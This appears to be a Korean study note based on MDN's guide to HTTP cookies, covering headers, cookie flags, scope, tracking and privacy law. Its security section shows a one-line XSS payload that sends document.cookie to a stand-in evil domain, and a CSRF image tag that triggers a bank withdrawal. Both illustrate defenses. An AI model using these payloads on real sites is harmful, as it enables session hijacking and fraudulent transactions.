# Cookie

HTTP 쿠키(웹 쿠키, 브라우저 쿠키)는 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각입니다. 브라우저는 그 데이터 조각들을 저장해 놓았다가, 동일한 서버에 재 요청 시 저장된 데이터를 함께 전송합니다. 쿠키는 두 요청이 동일한 브라우저에서 들어왔는지 아닌지를 판단할 때 주로 사용합니다. 이를 이용하면 사용자의 로그인 상태를 유지할 수 있습니다. 상태가 없는([stateless](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)) HTTP 프로토콜에서 상태 정보를 기억시켜주기 때문입니다.

쿠키는 주로 세 가지 목적을 위해 사용된다.

**세션 관리(Session management)**

서버에 저장해야 할 로그인, 장바구니, 게임 스코어 등의 정보 관리

**개인화(Personalization)**

사용자 선호, 테마 등의 세팅

**트래킹(Tracking)**

사용자 행동을 기록하고 분석하는 용도



> 저장된 쿠키(그리고 웹 페이지가 사용할 수 있는 다른 스토리지)를 보려면, 개발자 도구에서 [Storage Inspector(스토리지 검사기)](https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector)를 활성화하고 스토리지 트리에서 쿠키 스토리지를 선택하면 됩니다.



## 쿠키 만들기

HTTP 요청을 수신할때 , 서버는 응답과 함께 `Set-Cookie` 헤더를 전송할 수 있다.
쿠키는 보통 브라우저에 의해 저장되며 그 후에는 같은 서버에 의해 만들어진 요청(Request) 들의 `Cookie` HTTP 헤더안에 포함되어 전송된다. 만료일 혹은 지속시간 설정이 가능하고, 만료된 쿠키는 더이상 보내지 않는다.  추가적으로 특정 도메인 혹은 경로 제한을 설정할 수 있으며 이는 쿠키가 보내지는 것을 제한할 수 있다.



### Set-Cookie 그리고 Cookie 헤더

[`Set-Cookie`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie) HTTP 응답 헤더는 서버로부터 사용자 에이전트로 전송됩니다. 아래와 같이 설정 가능하다.

```http
Set-Cookie: <cookie-name>=<cookie-value>
```

이 서버 헤더는 클라이언트에게 쿠키를 저장하라고 전달한다.

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

이제, 서버로 전송되는 모든 요청과 함께, 브라우저는 [`Cookie`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Cookie) 헤더를 사용하여 서버로 이전에 저장했던 모든 쿠키들을 회신한다.

```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```



### 세션 쿠키

위에서 생성된 쿠키는 `세션 쿠키`이다. 클라이언트가 종료되면 삭제 될 것이다.  이유는 `Expires` 혹은 `Max-Age`를 명시하지 않았기 때문이다. 그러나 웹 브라우저는 **세션 복구**를 할 수 있으며, 이 기능은 브라우저가 결코 닫힌 적이 없던 것처럼 대부분의 세션 쿠키들을 영속적인 것으로 만든다.



### 영속적인 쿠키

클라이언트가 닫힐 때 만료되는 대신에, *영속적인 쿠키*는 명시된 날짜(`Expires`)에 만료되거나 혹은 명시한 기간(`Max-Age`) 이후에 만료됩니다.

```html
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```



### Secure과 HttpOnly 쿠키

Secure 쿠키는 HTTPS 프로토콜 상에서 암호화된(encrypted ) 요청일 경우에만 전송됩니다. 하지만 `Secure`일지라도 민감한 정보는 절대 쿠키에 저장되면 안된다, 본질적으로 안전하지 않고 이 플래그가 당신에게 실질적인 보안(real protection)를 제공하지 않기 때문입니다. 크롬52 혹은 파이어폭스52로 시작한다면, 안전하지 않은 사이트(`http:`) 는 쿠키에 `Secure` 설정을 지시할 수 없습니다.

Cross-site 스크립팅 ([XSS](https://developer.mozilla.org/ko/docs/Glossary/XSS)) 공격을 방지하기 위해, `HttpOnly`쿠키는 JavaScript의 [`Document.cookie`](https://developer.mozilla.org/ko/docs/Web/API/Document/cookie) API에 접근할 수 없습니다; 그들은 서버에게 전송되기만 합니다. 예를 들어, 서버 쪽에서 지속되고 있는 세션의 쿠키는 JavaScript를 사용할 필요성이 없기 때문에 `HttpOnly`플래그가 설정될 것이다.

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```



### 쿠키의 스코프

`Domain` 그리고 `Path` 디렉티브는 쿠키의 **스코프**를 어떤 URL을 쿠키가 보내야 하는지 정의합니다. 

`Domain`은 쿠키가 전송되게 될 호스트들을 명시합니다. 만약 명시되지 않는다면, (서브 도메인은 포함되지 않는) 현재 문서 위치의 호스트 일부를 기본값으로 합니다. 도메인이 명시되면, 서브도메인들은 항상 포함됩니다.

만약 `Domain=mozilla.org`이 설정되면, 쿠키들은 `developer.mozilla.org`와 같은 서브도메인 상에 포함되게 됩니다.

`Path`는 `Cookie` 헤더를 전송하기 위하여 요청되는 URL 내에 반드시 존재해야 하는 URL 경로입니다. %x2F ("/") 문자는 디렉티브 구분자로 해석되며 서브 디렉토리들과 잘 매치될 것입니다.

만약 `Path=/docs`이 설정되면, 다음의 경로들은 모두 매치될 것입니다:

- /docs
- /docs/Web/
- /docs/Web/HTTP



### SameSite 쿠키

`SameSite` 쿠키는 쿠키가 cross-site 요청과 함께 전송되지 않았음을 요구하게 만들어, cross-site 요청 위조 공격([CSRF](https://developer.mozilla.org/ko/docs/Glossary/CSRF))에 대해 어떤 보호 방법을 제공한다. `SameSite` 쿠키는 여전히 실험 중이며 모든 브라우저에 의해 아직 제공되지 않는다.



### Document.cookie를 사용한 자바스크립트 접근

새로운 쿠키들은 [`Document.cookie`](https://developer.mozilla.org/ko/docs/Web/API/Document/cookie)를 사용해 만들어질 수도 있으며, `HttpOnly` 플래그가 설정되지 않은 경우 기본의 쿠키들은 자바스크립트로부터 잘 접근될 수 있습니다

```js
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

아래 [보안](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Security) 섹션에서 다루고 있는데로 보안 관련 내용들을 잘 알아두자. 자바스크립트에서 이용 가능한 쿠키들은 XSS를 통해 감청될 수 있다.



## 보안

> 기밀 혹은 민감한 정보는 전체 메커니즘이 본질적으로 위험하기 때문에 HTTP 쿠키 내에 저장되거나 전송되어서는 안됩니다.



### 세션 하이재킹과 XSS

쿠키는 대개 웹 애플리케이션에서 사용자와 그들의 인증된 세션을 식별하기 위해 사용되곤 한다. 그래서 쿠키를 가로채는 것은 인증된 사용자의 세션 하이재킹으로 이어질 수 있습니다. 쿠키를 가로채는 일반적인 방법은 소셜 공학 사용 혹은 애플리케이션 내 [XSS](https://developer.mozilla.org/ko/docs/Glossary/XSS) 취약점을 이용하는 것을 포함합니다.

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly` 쿠키 속성은 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있습니다.



### Cross-site 요청 위조 (CSRF)

[위키피디아](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)에 [CSRF](https://developer.mozilla.org/ko/docs/Glossary/CSRF)에 대한 좋은 예제가 있습니다. 위키피디아의 예와 같은 상황에서, 당신의 은행 서버에 돈을 입금하는 실제 요청 대신에, 실제로는 이미지가 아닌 이미지를 포함시키고 있습니다(예를 들어 필터링되지 않은 채팅이나 포럼 페이지 내에)

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

이제, 당신이 당신의 은행 계좌에 로그인하고 당신의 쿠키가 여전히 유효하다면(그리고 별 다른 검증 절차가 존재하지 않는다면), 해당 이미지를 포함하고 있는 HTML을 로드하자마자 돈이 송금될 것입니다. 이런 일들이 벌어지는 것을 방지하기 위한 몇 가지 기술이 있습니다:

- [XSS](https://developer.mozilla.org/ko/docs/Glossary/XSS)와 마찬가지로, 입력 필터링은 중요한 문제이다.
- 모든 민감한 동작에 필수로 요구되는 확인 절차가 항상 수행되도록 한다.
- 민감한 동작에 사용되는 쿠키는 짧은 수명만 갖도록 한다.
- 좀 더 많은 예방 팁은 [OWASP CSRF 예방 치트 시트](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)를 참고하자.



## 트래킹과 프라이버시

### 서드파티 쿠키

쿠키는 그와 관련된 도메인을 가집니다. 이 도메인이 당신이 현재 보고 있는 페이지의 도메인과 동일하다면, 그 쿠키는 **퍼스트파티 쿠키**라고 불립니다. 만약 도메인이 다르다면, **서드파티 쿠키**라고 부릅니다. 퍼스트파티 쿠키가 그것을 설정한 서버에만 전송되는데 반해, 웹 페이지는 다른 도메인의 서버 상에 저장된 (광고 배너와 같은) 이미지 혹은 컴포넌트를 포함할 수도 있습니다. 이러한 서드파티 컴포넌트를 통해 전송되는 쿠키들을 서드파티 쿠키라고 부르며 웹을 통한 공과와 트래킹에 주로 사용됩니다. [구글이 사용하는 쿠키 타입](https://www.google.com/policies/technologies/types/)을 예로 참고하시기 바랍니다. 대부분의 브라우저들은 기본적으로 서드파티 쿠키를 따르지만, 그것을 차단하는데 이용되는 애드온들이 있습니다(예를 들어, [EFF](https://www.eff.org/)이 만든 [Privacy Badger](https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/)이 있습니다).

당신이 만약 서드파티 쿠키를 공개하고 있지 않다면, 쿠키 사용이 밝혀질 경우 소비자 신뢰를 잃을 수도 있습니다. (프라이버시 정책과 같은) 명백한 공개는 쿠키 발견과 관련된 모든 부정적인 효과를 없애는 경향이 있습니다. 어떤 국가들은 쿠키에 관한 법률도 가지고 있습니다. 위키피디아의 [쿠키 구문](https://wikimediafoundation.org/wiki/Cookie_statement)을 예로 참고하시기 바랍니다.



### Do-Not-Track

쿠키 사용에 대한 합법적이거나 기술적인 요구사항은 없지만, [`DNT`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/DNT) 헤더는 웹 애플리케이션이 트래킹 혹은 개인 사용자의 cross-site 사용자 트래킹 모두를 비활성화하는 신호로 사용될 수 있습니다. 좀 더 자세한 내용은 [`DNT`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/DNT) 헤더를 참고하시기 바랍니다.



### EU 쿠키 디렉티브

EU 전역의 쿠키에 대한 요구사항은 유럽 의회의 [Directive 2009/136/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136)에 정의되어 있으며 2011년 5월 25일에 발효되었습니다. 디렉티브는 그 자체로 법은 아니지만, 디렉티브의 요구사항을 만족시키는 법을 제정하려는 EU 회원국들을 위한 요구사항입니다. 실제 법들은 나라마다 다를 수 있습니다.

짧게 말하자면, EU 디렉티브는 컴퓨터, 모바일 폰 혹은 다른 기기들에서 누군가가 어떤 정보든지 저장하거나 검색하기 전에, 사용자는 그렇게 하기 위해 사전 동의해야만 한다는 내용입니다. 많은 웹 사이트들은 사용자가에게 쿠키 사용에 대한 내용을 알려준 뒤에 배너들을 추가할 수 있습니다.

좀 더 자세한 내용은 [여기 위키피디아 섹션](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive)을 보시고 가장 최근의 가장 정확한 정보는 국가법을 참고하시기 바랍니다.



### 좀비 쿠키와 Evercookies

쿠키에 대한 좀 더 급진적인 해결책은 삭제 이후에 다시 생성되는 좀비 쿠키 혹은 "Evercookies"이며 의도적으로 영원히 제거하는 것이 어려운 쿠키입니다. 그들은 쿠키가 존재 여부와 관계없이 그들 자신을 다시 만들어내기 위해 [웹 스토리지 API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API), Flash 로컬 공유 객체 그리고 다른 기술들을 사용하고 있습니다.

- [Samy Kamkar의 Evercookie](https://github.com/samyk/evercookie)
- [좀비 쿠키에 대한 위키피디아](https://en.wikipedia.org/wiki/Zombie_cookie)



## 참고

- https://developer.mozilla.org/ko/docs/Web/HTTP/Cookies